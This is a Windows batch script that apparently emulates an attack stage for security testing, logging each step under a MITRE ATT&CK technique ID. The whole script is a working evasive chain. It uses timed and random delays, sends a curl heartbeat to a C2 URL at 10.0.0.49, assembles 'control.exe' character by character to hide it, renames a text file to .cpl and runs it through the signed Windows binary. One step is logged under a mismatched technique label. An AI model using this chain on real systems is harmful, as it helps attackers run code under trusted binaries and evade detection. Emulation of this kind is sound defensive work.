@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals)
SET yktnwwf=%APPDATA%\8905\56f186ac
SET fpakbq=Macula-Stage0-8905
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8905-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=project.txt
SET fpldhe=8905

REM Log file
SET logvar=!APPDATA!\!yydue!\macula-simulations.log

REM Initial delay
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=initial>> "!logvar!" 2>nul
timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_complete=initial>> "!logvar!" 2>nul

REM C2 Heartbeat (not obfuscated)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start=!rdzgrnne!>> "!logvar!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
SET ttpresult=1
SET errdetail=
IF ERRORLEVEL 1 SET ttpresult=0&SET errdetail=connection_failed
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218.002|Signed Binary Proxy Execution (Control)=!ttpresult!:!errdetail!>> "!logvar!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_complete=!ERRORLEVEL!>> "!logvar!" 2>nul

REM Delay between operations
ping -n 8 127.0.0.1 >nul

REM Obfuscated control.exe using character-by-character building
SET c1=c
SET c2=o
SET c3=n
SET c4=t
SET c5=r
SET c6=o
SET c7=l
SET c8=.
SET c9=e
SET c10=x
SET c11=e
SET lolbin=!c1!!c2!!c3!!c4!!c5!!c6!!c7!!c8!!c9!!c10!!c11!

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!logvar!" 2>nul
cd /d "!yktnwwf!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_complete=!ERRORLEVEL!>> "!logvar!" 2>nul

REM Random delay
SET /A randdelay=%RANDOM% %% 15 + 8
timeout /t !randdelay! /nobreak >nul

REM Rename DLL to CPL (CPL extension obfuscated)
SET e1=c
SET e2=p
SET e3=l
SET ext=!e1!!e2!!e3!
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_start=!edjwtl!>> "!logvar!" 2>nul
ren "!edjwtl!" "file.!ext!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_complete=!ERRORLEVEL!>> "!logvar!" 2>nul

REM Execute control.exe with CPL
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start=control_file.cpl>> "!logvar!" 2>nul
%lolbin% file.!ext!
SET ttpresult=1
SET errdetail=
IF ERRORLEVEL 1 SET ttpresult=0&SET errdetail=execution_failed
echo [!DATE! !TIME!][!omxgazu!]: !yydue!-!fpldhe!-T1218.011|Signed Binary Proxy Execution (Rundll32)=!ttpresult!:!errdetail!>> "!logvar!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_complete=!ERRORLEVEL!>> "!logvar!" 2>nul